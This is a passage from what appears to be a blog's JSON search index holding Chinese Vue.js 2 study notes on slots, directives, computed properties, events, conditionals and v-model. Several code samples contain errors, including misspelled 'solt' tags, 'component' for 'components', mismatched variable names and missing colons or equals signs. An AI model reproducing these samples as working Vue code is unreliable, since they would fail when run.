12345678910111213141516171819202122232425262728&lt;div id=&#x27;app&#x27;&gt; &lt;cpn v-show=&#x27;isShow&#x27;&gt;&lt;/cpn&gt; &lt;!-- 使用实例的isShow --&gt;&lt;/div&gt;&lt;template id=&#x27;cpn&#x27;&gt; &lt;h2&gt;我是组件&lt;/h2&gt; &lt;button v-show=&quot;isShow&quot;&gt;按钮&lt;/button&gt; &lt;!-- 使用组件的isShow --&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, isShow:true, &#125;, component:&#123; cpn:&#123; template:&#x27;#cpn&#x27;, data()&#123; return &#123; isShow:false, &#125; &#125; &#125; &#125; &#125;)&lt;/script&gt; 9.4 作用域插槽 父组件替换插槽的标签，但是内容由子组件来提供 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;div id=&quot;app&quot;&gt; &lt;cpn&gt;&lt;/cpn&gt; &lt;cpn&gt; &lt;!-- 目的是 获取组件中的pLanguage --&gt; &lt;!-- 在2.5.x以下的版本 只能使用template 但是后面的版本可以直接 使用div--&gt; &lt;!-- 通过solt引用 下面插槽对象 下面用的solt.data 用的就是下面的data ==planage--&gt; &lt;template slot-scope=&#x27;solt&#x27;&gt; &lt;span v-for=&#x27;item in solt.data&#x27;&gt;&#123;&#123;item&#125;&#125; - &lt;/span&gt; &lt;/template&gt; &lt;/cpn&gt; &lt;cpn&gt; &lt;template slot-scope=&#x27;solt&#x27;&gt; &lt;!-- 以‘ - ’分割 --&gt; &lt;span&gt;&#123;&#123;solt.data.join(&#x27; - &#x27;)&#125;&#125;&lt;/span&gt; &lt;/template&gt; &lt;/cpn&gt;&lt;/div&gt;&lt;template id=&#x27;cpn&#x27;&gt; &lt;div&gt; &lt;!-- data是随便取的名字 意味着data指向pLanguage --&gt; &lt;solt :data=&#x27;pLanguages&#x27;&gt; &lt;ul&gt;&lt;li v-for=&#x27;item in pLanguages&#x27;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;&lt;/ul&gt; &lt;/solt&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, &#125;, component:&#123; cpn:&#123; template:&quot;#cpn&quot;, data()&#123; return &#123; pLanguages:[&#x27;js&#x27;,&#x27;java&#x27;,&#x27;python&#x27;,&#x27;c&#x27;] &#125; &#125; &#125; &#125; &#125;)&lt;/script&gt;","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"01 Vue入门","slug":"vue/01邂逅Vuejs","date":"2021-03-08T16:00:00.000Z","updated":"2022-04-10T11:03:10.811Z","comments":false,"path":"learningNotes/vue/01邂逅Vuejs","link":"learningNotes/vue/01邂逅Vuejs","permalink":"https://shylees.github.io/learningNotes/vue/01%E9%82%82%E9%80%85Vuejs","excerpt":"","text":"1. 认识Vuejs 1.1 为什么学习Vuejs 1.2 简单认识Vuejs Vue（读音类似view） Vue是一个渐进式框架（作为一部分嵌入页面js） Vue全家桶：Core+Vue-router+Vuex Vue有很多特点和Web开发中常见的高级功能 解耦视图和数据 可复用的组件 前端路由技术 状态管理 虚拟DOM 2. Vue.js安装方式 2.1 方式一：CDN引入 选择引入开发环境版本还是生产环境版本 12345&lt;!-- 开发环境版本，包含了由版主的命令行警告 --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt;&lt;!-- 生产环境版本，优化了尺寸和速度 --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue&quot;&gt;&lt;/script&gt; 2.2 方式二：下载和引入 开发环境：https://vuejs.org/js/vue.js 生产环境：https://vuejs.org/js/vue.min.js 2.3 方式三：NPM安装管理 后续通过webpack和CLI的使用，我们使用该方式 3. Vuejs初体验 3.1 Hello Vuejs vue：编程范式：声明式编程 js：编程范式：命令式编程 3.2 Vue列表展示 3.3 案例：计数器 语法糖：简写的另一种说法 4. Vuejs的MVVM MVVM：（Model View View Model）最重要的是中间的ViewModel层，是View和Model之间安定桥梁 学习一个概念最好的方式是去看维基百科 https://zh.wikipedia.org/wiki/MVVM 4.1 Vue中的MVVM 5. 创建Vue实例传入的options options中可以包含的选项：https://cn.vuejs.org/v2/api/#选项-数据 目前掌握这些选项： el： 类型：string|HTMLElement 作用：决定之后Vue实例会管理哪一个DOM data： 类型：Object|Function （组件中data必须是一个函数） 作用：Vue实例对应的数据对象 methods： 类型：{ [key:string]:Function } 作用：定义属于Vue的一些方法，可以再其他地方调用，也可以在指令中使用 不能使用箭头函数 5.1 方法跟函数的区别 方法：method 函数：function 一般在js中写的都是函数 但与实例挂钩的就是方法，例如类里面和Vue里面，方法是面向对象的 5.2 Vue的生命周期 事物从诞生到死亡 到GitHub下载源码时：不要直接下载开发版本，选择tag最新的稳定版 模板 缩进更多使用两个空格","categories":[{"name":"learningNotes","slug":"learningNotes","permalink":"https://shylees.github.io/categories/learningNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"02 Vue基础语法","slug":"vue/02 Vue基础语法","date":"2021-03-08T16:00:00.000Z","updated":"2021-03-11T16:00:00.000Z","comments":false,"path":"learningNotes/vue/02 Vue基础语法","link":"learningNotes/vue/02 Vue基础语法","permalink":"https://shylees.github.io/learningNotes/vue/02%20Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95","excerpt":"","text":"1.插值语法（p12-13） 1.1 Mustache语法 插值表达式&#123;&#123; &#125;&#125; 在内容区书写的 不能在属性值书写 不仅可以直接写变量 ，也可以写简单的表达式 1.2 其他指令的使用 v-once 某些情况下，可能不希望界面随意的跟随改变 该指令后面不需要跟任何表达式/值 该指令表示元素和组件只渲染一次，不会随着数据的改变而改变 123&lt;div id=&#x27;app&#x27;&gt; &lt;h2 v-once&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt;&lt;/div&gt; v-html 某些情况下，从服务器请求到的数据本身就是html代码，if直接通过&#123;&#123;&#125;&#125;`来输出，会将html代码也一起输出 + 该指令会将string的html解析出来并且进行渲染 + 该指令后面往往会跟上一个个string类型 1234567891011&lt;div id=&#x27;app&#x27;&gt; &lt;h2 v-html=&#x27;url&#x27;&gt;&lt;/h2&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&#x27;#app&#x27;, data:&#123; url:&#x27;&lt;a href=&quot;https://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27; &#125; &#125;)&lt;/script&gt; #### v-text + 该指令和Mustache比较相似：都是用于将数据显示在界面中 + 该指令通常情况下，接收一个string类型 123456789101112&lt;div id=&#x27;app&#x27;&gt; &lt;h2&gt;&#123;&#123; message &#125;&#125; vuejs&lt;/h2&gt; &lt;!-- hello vuejs --&gt; &lt;h2 v-text=&#x27;message&#x27;&gt;vuejs&lt;/h2&gt; &lt;!-- hello --&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&#x27;#app&#x27;, data:&#123; message:&#x27;hello&#x27; &#125; &#125;)&lt;/script&gt; #### v-pre + 用于跳过这个元素和它子元素的编译过程，用于显示原本的Mustache语法 1234567891011&lt;div id=&#x27;app&#x27;&gt; &lt;h2 v-pre&gt;&#123;&#123; message &#125;&#125;&lt;/h2&gt; &lt;!-- &#123;&#123; message &#125;&#125; --&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&#x27;#app&#x27;, data:&#123; message:&quot;hello&quot; &#125; &#125;)&lt;/script&gt; #### v-cloak + 某些情况下，浏览器可能会直接显示出未编译的Mustache标签 + cloak（斗篷） + 在vue解析之前，div中有一个属性v-cloak + 在vue解析之后，div中没有一个属性v-cloak 1234567891011121314151617181920&lt;style&gt; [v-cloak]&#123; display:none; &#125; &lt;/style&gt;&lt;div id=&#x27;app&#x27; v-cloak&gt; &#123;&#123; message &#125;&#125;&lt;/div&gt;&lt;script&gt; setTimeout(function()&#123; const app = new Vue(&#123; el:&#x27;#app&#x27;, data:&#123; message:&#x27;hello&#x27; &#125; &#125;) &#125;)&lt;/script&gt; ## 2.v-bind动态绑定(p14-19) ### 2.1 v-bind绑定基本属性 + 前面学习的指令主要作用是将值插入到我们的模板的内容中 + 除了内容需要动态决定外，某些属性也希望能动态绑定 + 该指令v-bind： + 作用：动态绑定属性 + 缩写：`:` + 预期：any（with argument）| Object（without argument） + 参数：attrOrProp（optional） 123456&lt;div id=&#x27;app&#x27;&gt; &lt;img src=&#x27;&#123;&#123;imgsrc&#125;&#125;&#x27;&gt; &lt;!-- 直接将&#123;&#123;imgsrc&#125;&#125;赋值给src了 --&gt; &lt;img src=&#x27;imgsrc&#x27;&gt; &lt;!-- 同上理 --&gt; &lt;img v-bind:src=&#x27;imgsrc&#x27;&gt; &lt;!-- 这样才会解析vue中的imgsrc --&gt;、 &lt;img :src=&#x27;imgsrc&#x27;&gt; &lt;!-- 语法糖 --&gt;&lt;/div&gt; ### 2.2 v-bind动态绑定class（对象语法） 对象语法的含义是：class后面跟的是一个对象 + **用法一：直接通过`&#123;&#125;`绑定一个类** 1&lt;h2 :class=&quot;&#123;&#x27;active&#x27;:isActive&#125;&quot;&gt;Hello World&lt;/h2&gt; + **用法二：可以通过判断，传入多个值** 1&lt;h2 :class=&quot;&#123;&#x27;active&#x27;:isActiven,&#x27;line&#x27;:isLine&#125;&quot;&gt;Hello World&lt;/h2&gt; + **用法三：和普通的类同时存在，并不冲突** 1&lt;h2 class=&quot;title&quot; :class=&quot;&#123;&#x27;active&#x27;:isActiven,&#x27;line&#x27;:isLine&#125;&quot;&gt;Hello World&lt;/h2&gt; + **用法四：如果过于复杂，可以放在一个methods或者computed中** 12345678910111213141516171819202122&lt;h2 class=&quot;title&quot; :class=&quot;classes&quot;&gt;Hello World&lt;/h2&gt; &lt;!-- classes是一个计算属性 --&gt;&lt;div id=&#x27;app&#x27;&gt; &lt;!-- &lt;h2 v-bind:class=&quot;&#123;类名1:boolean, 类名2: boolean&#125;&quot;&gt;&lt;/h2&gt; --&gt; &lt;h2 class=&#x27;title&#x27; v-bind:class=&quot;&#123;active:isActive,line:isLine&#125;&quot;&gt;&lt;/h2&gt; &lt;h2 class=&#x27;title&#x27; v-bind:class=&quot;getClasses()&quot;&gt;&lt;/h2&gt; &lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; isActive:true, isLine:true &#125;, methods:&#123; getClasses:function()&#123; return &#123;active:this.isActive,line:this.isLine&#125; &#125; &#125; &#125;)&lt;/script&gt; ### 2.3 v-bind动态绑定class（数组语法） 123456789101112131415161718&lt;h2 class=&#x27;title&#x27; :class&quot;[&#x27;active&#x27;,&#x27;line&#x27;]&quot;&gt;&lt;/h2&gt; &lt;!-- 与class=“title active line” 同 --&gt;&lt;h2 class=&#x27;title&#x27; :class&quot;[active,line]&quot;&gt;&lt;/h2&gt; &lt;!-- 此时就是变量 --&gt;&lt;h2 class=&#x27;title&#x27; :class&quot;getClasses()&quot;&gt;&lt;/h2&gt; &lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; active:&#x27;aaa&#x27;, line:&#x27;bbb&#x27; &#125;, methods:&#123; getClasses:function()&#123; return [this.active,this.line] &#125; &#125; &#125;)&lt;/script&gt; ### 2.4 v-bind绑定style（对象语法） + style后面跟的是一个对象类型 12345678910111213141516171819202122232425&lt;h2 :style=&quot;&#123;key(属性名,可以不加&#x27;&#x27;):value(属性值,要加&#x27;&#x27;)&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;&lt;h2 :style=&quot;&#123;&#x27;font-size&#x27;(或者fontSize、-要加&#x27;&#x27;):&#x27;50px&#x27;(if无&#x27;&#x27;会看作变量报错)&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;&lt;h2 :style=&quot;&#123;font-size:finalSize(当成变量使用/finalSize2+&#x27;px&#x27;)&#125;&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;&lt;h2 :style=&quot;grtStyles()&quot;&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; finalSize:&quot;50px&quot;, finalSize2:100, finalColor:&quot;red&quot; &#125;, methods&#123; getStyles:function()&#123; return &#123;fontSize:this.finalSize,color:this.finalColor&#125; &#125; &#125; &#125;)&lt;/script&gt; ### 2.5 v-bind绑定style（数组语法） + style后面跟的是一个数组类型 + 多个值以‘,’分割 12345678910&lt;div v-bind:style=&quot;[baseStyle,baseStyle2]&quot;&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; baseStyle:&#123;color:&quot;red&quot;&#125;, baseStyle:&#123;fontSize:&#x27;100px&#x27;&#125; &#125; &#125;)&lt;/script&gt; ## 3. 计算属性(p20-25) ### 3.1 基本使用 123456789101112131415161718192021222324252627282930&lt;div id=&quot;app&quot;&gt; &lt;h2&gt;&#123;&#123;firstname + &#x27; &#x27; + lastname&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;firstname&#125;&#125; &#123;&#123;lastname&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;getfullname()&#125;&#125;&lt;/h2&gt; &lt;h2&gt;&#123;&#123;fullname&#125;&#125;&lt;/h2&gt; &lt;!-- 计算属性 是方法 但是也当作属性看 --&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; firstname:&#x27;lebron&#x27;, lastname:&#x27;james&#x27; &#125;, computed:&#123; //当作属性看 所以方法的命名可以是属性的命名 fullname:function()&#123; return this.firstname + &#x27; &#x27; + this.lastname; &#125; &#125;, methods:&#123; //当作属性看 所以方法的命名可以是属性的命名 getfullname:function()&#123; return this.firstname + &#x27; &#x27; + this.lastname; &#125; &#125; &#125;)&lt;/script&gt; ### 3.2 复杂操作 1234567891011121314151617181920212223242526&lt;div id=&quot;app&quot;&gt; &lt;h2&gt;书的总价 &#123;&#123;totalprice&#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; books:[ &#123;id:11,name:&quot;红宝书&quot;,price:119&#125;, &#123;id:12,name:&quot;红宝书2&quot;,price:100&#125;, &#123;id:13,name:&quot;红宝书3&quot;,price:95&#125;, &#123;id:14,name:&quot;红宝书4&quot;,price:45&#125; ] &#125;, computed:&#123; //当作属性看 所以方法的命名可以是属性的命名 totalprice:function()&#123; let res = 0; for(let i = 0 ; i &lt; this.books.length ; i++)&#123; res += this.books[i].price &#125; return res; &#125; &#125; &#125;)&lt;/script&gt; ### 3.3 计算属性的setter和getter + 每个计算属性都包含一个setter和getter + 上述例子只使用了getter + 某些情况下也会需要setter方法（不常用） + 例如： 12345678910111213141516171819202122232425262728293031323334&lt;div id=&quot;app&quot;&gt; &lt;h2&gt;&#123;&#123;fullname&#125;&#125;&lt;/h2&gt; &lt;!-- 就算是有get set 也不加() --&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; firstname:&#x27;lebron&#x27;, lastname:&#x27;james&#x27; &#125;, computed:&#123; fullname:&#123; set:function(newname)&#123; const names = newname.split(&#x27; &#x27;); this.fristname = names[0]; this.lastname= names[1]; &#125;, get:function()&#123; return this.firstname + &#x27; &#x27; + this.lastname; &#125; &#125; //因为一般只有get属性 只读 所以就可以简写成下面 //fullname:&#123; // get:function()&#123; // return this.firstname + &#x27; &#x27; + this.lastname; // &#125; //&#125; //fullname:function()&#123; // return this.firstname + &#x27; &#x27; + this.lastname; //&#125; &#125; &#125;)&lt;/script&gt; ### 3.4 计算属性的缓存 计算属性和methods的区别 在多次调用时： + 计算属性只会调用一次，内部有缓存，如果值不变，就不会再调用，会直接使用，性能比较高 + methods会调用多次，每次都会重新计算，性能较低 所以更多使用计算属性会比较好 ## 4.es6补充（p26-29） ### 4.1 let/var 块级作用域 + 变量作用域：变量能够使用的范围 + 没有块级作用域引起的问题：if的块级 + 没有块级作用域引起的问题：for的块级 12345678910111213141516var btns = document.querySelector(&#x27;button&#x27;);for(var i = 0; i &lt; btns.length; i++)&#123; //因为i的作用域问题 所以会i一直都是btns.length btns[i].addEventListener(&quot;click&quot;,function()&#123; console.log(&#x27;第&#x27; + i + &#x27;个按钮被点击&#x27; ); &#125;) //解决一：闭包（立即执行函数） //原因：函数是一个作用域 (function(i)&#123; btns[i].addEventListener(&quot;click&quot;,function()&#123; console.log(&#x27;第&#x27; + i + &#x27;个按钮被点击&#x27; ); &#125;) &#125;)(i) &#125; + es5之前因为if和for都没有块级作用域的概念，所以再很多时候，都必须借助于function的作用域来解决应用外面变量的问题 + es6中，let有if和for的块级作用域 ### 4.2 const的使用 es6开发中，优先使用const，只有需要改变一个标识符时才使用let + 给const修饰的标识符被赋值后，不能再改变 + 再使用const定义标识符，必须进行赋值 + 常量的含义是指向对象不能修改，但是对象内部的属性可以修改 ### 4.3 对象字面量的增强写法 123456const obj = new Object();//字面量const obj = &#123; &#125; #### 1.属性的增强写法 1234567891011121314151617const name = &#x27;why&#x27;;const age = 18;const height = 1.88;//es5的写法const obj = &#123; name:name, age:age, height:height&#125;//es6的写法const obj =&#123; name, age, height&#125; #### 2.函数的增强写法 12345678910111213141516171819//es5的写法const obj = &#123; run:function()&#123; &#125;, eat:function()&#123; &#125;&#125;//es6的写法const obj = &#123; run()&#123; &#125;, eat()&#123; &#125;&#125; ## 5. v-on事件监听（p30-32） ### 5.1 v-on基本使用 + 作用：绑定事件监听器 + 缩写：@ + 预期：Function|Inline Statement|Object + 参数：event ### 5.2 v-on参数问题 + $event 12345678910111213141516171819202122232425262728293031&lt;!-- 1.事件调用的方法没有参数 ()可省略--&gt;&lt;button @click=&quot;btnClick()&quot;&gt;按钮1&lt;/button&gt;&lt;button @click=&quot;btnClick&quot;&gt;按钮1&lt;/button&gt;&lt;!-- 2.有参数时,若只写()没有传参 那么与普通对象一样 形参为undefined --&gt;&lt;!-- 若没有写() vue会默认将浏览器生产的event事件对象作为参数传入方法 --&gt;&lt;button @click=&quot;btn2Click(123)&quot;&gt;按钮2&lt;/button&gt;&lt;button @click=&quot;btn2Click()&quot;&gt;按钮2&lt;/button&gt;&lt;button @click=&quot;btn2Click&quot;&gt;按钮2&lt;/button&gt;&lt;!-- 3.在方法定义时，需要参数又需要event --&gt;&lt;!-- 在调用方法，手动获取到浏览器参数的event对象：$event --&gt;&lt;button @click=&quot;btn3Click(123,$event)&quot;&gt;按钮3&lt;/button&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123;&#125;, methods:&#123; btnClick()&#123; &#125;, btn2Click(abc)&#123; console.log(&quot;----&quot;,abc); &#125;, btn3Click(abc,event)&#123; console.log(abc,event); &#125; &#125; &#125;)&lt;/script&gt; ### 5.3 v-on 修饰符 + .stop - 调用event.stopPropagation() + .prevent - 调用event.preventDefault() + .&#123;keyCode | keyAlias&#125; -只当事件是从特定键触发时才触发回调 + .native - 监听组件根元素的原生事件 + .once - 只触发一次回调 123456789101112131415161718192021222324252627282930313233343536373839&lt;div id=&#x27;app&#x27;&gt; &lt;!-- 1..stop修饰符的使用 --&gt; &lt;div @click=&quot;divClick&quot;&gt; &lt;!-- if 不加 .stop 点击按钮也会点击到div 会触发事件冒泡 .stop 阻止事件冒泡--&gt; &lt;button @click.stop=&#x27;btnClick&#x27;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;!-- 2..prevent --&gt; &lt;form action=&quot;baidu&quot;&gt; &lt;!-- if 不加 会自动提交表单 --&gt; &lt;input type=&#x27;submit&#x27; value=&#x27;提交&#x27; @click.prevent=&#x27;submitClick&#x27;&gt; &lt;/form&gt; &lt;!-- 3. 监听某个键盘的键帽 keyup 松开键盘的时候触发--&gt; &lt;input type=&quot;text&quot; @keyup.enter=&quot;keyup&quot;&gt; &lt;!-- 4. .once 只会触发一次--&gt; &lt;button @click=&#x27;btnClick&#x27;&gt;按钮&lt;/button&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, methods:&#123; btnClick()&#123; console.log(&quot;btnClick&quot;); &#125;, divClick()&#123; console.log(&quot;divClick&quot;); &#125;, submitClick()&#123; console.log(&quot;submitClick&quot;); &#125;, keyup()&#123; console.log(&quot;keyup&quot;); &#125; &#125; &#125;)&lt;/script&gt; ## 6.条件判断v-if、v-else-if、v-else、v-show(p33-36) + 这三个指令与JavaScript的条件语句if、else、else if、类似 + Vue的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件 + v-if的原理： + v-if的值为false时，对应的元素及其子元素不会渲染 + 不会有对应的标签出现在DOM中 ### 6.1 v-if、v-else 12345678910111213141516171819&lt;div id=&quot;app&quot;&gt; &lt;h2 v-if=&quot;isShow&quot;&gt;isShow为true时显示&lt;/h2&gt; &lt;h1 v-else&gt;isShow为false时显示&lt;/h1&gt; &lt;!-- 如果有这样的情况 建议用computed做 不建议使用这么复杂的标签做 --&gt; &lt;p v-if=&quot;score &gt;= 90&quot;&gt;优秀&lt;/p&gt; &lt;p v-else-if=&quot;score &gt;= 80&quot;&gt;良好&lt;/p&gt; &lt;p v-else-if=&quot;score &gt;= 60&quot;&gt;及格&lt;/p&gt; &lt;p v-else&gt;不及格&lt;/p&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; isShow:true, score:99, &#125; &#125;)&lt;/script&gt; ### 6.2 账号/邮箱登录 input复用的问题解决（p34-p35） + 在两个input上+不同的key的值就可以了 + Vue ：在Dom渲染页面的时候会经过一层虚拟dom然后将相似的不会冲突的元素只渲染一遍 + 所以用不同的key把两个分开 + 这样就不会出现切换input时 input里面的value还存在的问题了 ### 6.3 v-show v-if：为false时，不会存在dom，删除/重新创建 v-show：为flase，display：none；block/none 切换频率高时，使用 ## 7.循环遍历（p37-44） ### 7.1 v-for 遍历数组和对象 1. 数组: `&#123;&#123; index+1 &#125;&#125; &#123;&#123; item &#125;&#125;&lt;/p&gt; 对象:&lt;li v-for=&quot;(value,key,index) in info&quot;&gt;&lt;/li&gt; 7.2 v-for绑定与不绑定key的区别 插入函数 splice : 1234567let letters = [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;];letters.splice(2,2); //返回[&quot;C&quot;,&quot;D&quot;]// letters = [&quot;A&quot;,&quot;B&quot;,&quot;E&quot;];let letters = [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;];letters.splice(2,0,&quot;F&quot;); //返回[]//[&quot;A&quot;,&quot;B&quot;,&quot;F&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;] 绑定key的格式： 1&lt;li v-for=&quot;item in letters&quot; :key=&quot;item&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt; 组件的key属性 官方推荐在使用v-for时，给对应的元素/组件添加上:key属性 2.2.0+ 的版本里，当在组件中使用 v-for 时，key 现在是必须的。因为没有key来保障循环中的唯一性，那么组件则会被打乱。 当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “就地复用” 策略。如果数据项的顺序被改变，Vue将不是移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素。 为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一 key 属性。 原因：和Vue的虚拟DOM的Diff（顺序表的插入）算法有关 所以我们需要使用key来给每个节点做一个唯一标识符，Diff算法就可以正确的识别此节点，找到正确的位置区插入新的节点 key的作用主要是为了高效的更新虚拟DOM 7.3 那些数组的方法是响应式的 push() ：可以跟多个 pop() :删除数组最后一个元素 shift()：删除数组的第一个元素 unshift()：在第一个前面增加元素 ，可以传多个值 splice()：删除/插入/替换元素 sort()： reverse()： 注意：通过索引值修改数组中的元素 这个方法不是响应式的 页面的元素不会响应式地改变 但是控制台上面的数据就换了 可以使用splice 使用Vue.set(this.letters,0,‘bbbb’); 7.4 作业+案例 保留两位小数 &#123;&#123; item.price.toFixed(2) &#125;&#125; 过滤器： （使用过滤器做这个功能会比较适合） 123456789101112131415161718192021222324&lt;td&gt;&#123;&#123; &#x27;￥&#x27; + item.price.toFixed(2) &#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123; getFinalPrice(item.price) &#125;&#125;&lt;/td&gt;&lt;!-- &lt;td&gt;&#123;&#123; item.price | 过滤器 &#125;&#125;&lt;/td&gt; 过滤器是有参数的 直接把|前面的作为参数传入 --&gt; &lt;td&gt;&#123;&#123; item.price | showPrice &#125;&#125;&lt;/td&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; book:[...], &#125;, methods:&#123; getFinalPrice(price)&#123; return &#x27;￥&#x27; + price.toFixed(2); &#125; &#125;, filters:&#123; showPrice(price)&#123; return &#x27;￥&#x27; + price.toFixed(2); &#125; &#125; &#125;)&lt;/script&gt; 8. JavaScript高阶函数的使用（p45） 8.1 循环 for循环 for-in for-of 8.2filter/map/reduce filter中的回调函数有一个要求：必须返回一个boolean值 true时：函数内部会自动将这次回调的n加入到新的数组中 false时：函数内部会过滤掉这次的n 12345678910111213141516171819202122232425262728293031323334const nums = [10,20,50,111,5555,12];//选出&lt;100的数 * 2 相加//1.filter 的使用let newNums = nums.filter(function(n)&#123; return n&lt;100;&#125;)console.log(newNums)//2.map的使用let new2Nums = newNums.map(function(n)&#123; return n*2;&#125;)console.log(new2Nums)//3.reduce的使用//对数组的全部内容进行汇总 第二个参数是初始值let total = new2Nums.reduce(function(preValue,n)&#123; return preValue + n;&#125;,0)//全部汇总 --&gt; 函数式编程let total = nums.filter(function(n)&#123; return n&lt;100;&#125;).map(function(n)&#123; return n*2;&#125;).reduce(function(preValue,n)&#123; return preValue + n&#125;,0)//使用简写let total = nums.filter(n =&gt; n&lt;100).map(n =&gt; n*2).reduce((pre,n) =&gt; pre +n ); 9.表单绑定v-model(p46-51) Vue中使用v-model指令来实现表单元素和数据的双向绑定 9.1 v-model 原理 v-model其实是一个语法糖，它的本质是包含两个操作： v-bind绑定value属性 v-on指令给当前元素绑定input事件 12345678910111213141516171819&lt;input type=&#x27;text&#x27; v-model=&quot;message&quot;&gt;&lt;!-- 等于 --&gt;&lt;input type=&#x27;text&#x27; v-bind:value=&quot;message&quot; v-on:input=&quot;message=$event.target.value&quot;&gt;&lt;!-- 等于 --&gt;&lt;input type=&#x27;text&#x27; :value=&quot;message&quot; @input=&quot;valueChange&quot;&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&quot;hello&quot;, &#125;, methods:&#123; valueChange(event)&#123; this.message = event.target.value; &#125; &#125; &#125;)&lt;/script&gt; 9.2 v-model 结合radio类型 123456789101112131415161718192021&lt;div id=&quot;app&quot;&gt; &lt;!-- 因为使用了v-model所以可以不使用name --&gt; &lt;label for=&#x27;male&#x27;&gt; &lt;input type=&quot;radio&quot; id=&quot;male&quot; value=&quot;男&quot; v-model=&#x27;sex&#x27;&gt;男 &lt;/label&gt; &lt;label for=&#x27;female&#x27;&gt; &lt;input type=&quot;radio&quot; id=&quot;female&quot; value=&quot;女&quot; v-model=&#x27;sex&#x27;&gt;女 &lt;/label&gt; &lt;!-- 因为vue里的sex有值 所以会有默认选上的 --&gt; &lt;h2&gt;您选择的性别为：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;script&gt; const app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&quot;hello&quot;, sex:&#x27;女&#x27; &#125; &#125;)&lt;/script&gt; 9.3 v-model 结合checkbox类型 12345678910111213141516171819202122232425&lt;div id=&quot;app&quot;&gt; &lt;!-- 1.checkbox 单选框 --&gt; &lt;label for=&quot;agree&quot;&gt; &lt;input type=&quot;checkbox&quot; id=&quot;agree&quot; v-model=&quot;isAgree&quot;&gt;同意协议 &lt;/label&gt; &lt;h2&gt;您的选择是:&#123;&#123; isAgree &#125;&#125;&lt;/h2&gt; &lt;button :disable=&quot;!isAgree&quot;&gt;下一步&lt;/button&gt; &lt;!-- 2.checkbox 多选框 --&gt; &lt;input type=&quot;checkbox&quot; value=&quot;篮球&quot; v-model=&quot;bobbies&quot;&gt;篮球 &lt;input type=&quot;checkbox&quot; value=&quot;足球&quot; v-model=&quot;bobbies&quot;&gt;足球 &lt;input type=&quot;checkbox&quot; value=&quot;兵乓球&quot; v-model=&quot;bobbies&quot;&gt;兵乓球 &lt;input type=&quot;checkbox&quot; value=&quot;羽毛球&quot; v-model=&quot;bobbies&quot;&gt;羽毛球 &lt;h2&gt;您的爱好是：&#123;&#123; hobbies &#125;&#125;&lt;/h2&gt;&lt;/div&gt;&lt;script&gt; let app = new Vue(&#123; el:&quot;#app&quot;, data:&#123; message:&#x27;hello&#x27;, isAgree:false, hobbies:[] &#125; &#125;)&#125;&lt;/script&gt; 9.4 v-model结合select类型 123456789101112131415161718192021222324252627282930&lt;div id=&#x27;#app&#x27;&gt; &lt;!-- 1.选择一个 --&gt; &lt;select name=&quot;abc&quot; v-model=&quot;fruit&quot;&gt; &lt;option value=&quot;苹果&quot;&gt;苹果&lt;/option&gt; &lt;option value=&quot;香蕉&quot;&gt;香蕉&lt;/option&gt; &lt;option value=&quot;榴莲&quot;&gt;榴莲&lt;/option&gt; &lt;option 